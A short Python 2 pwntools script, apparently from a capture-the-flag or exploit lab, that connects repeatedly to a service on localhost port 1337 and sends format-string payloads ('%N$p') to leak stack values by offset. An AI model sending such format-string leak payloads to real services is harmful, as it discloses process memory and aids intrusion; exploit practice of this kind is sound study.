#!/usr/bin/python2

from pwn import *

leaks = []

for i in range(100):
	p = remote('localhost', 1337)
	p.recv()
	p.sendline('%{}$p'.format(i))
	p.recvuntil('Thank you ')
	leak = p.recvuntil('\n', drop=True)
	leaks.append((i, leak))
	p.close()
print leaks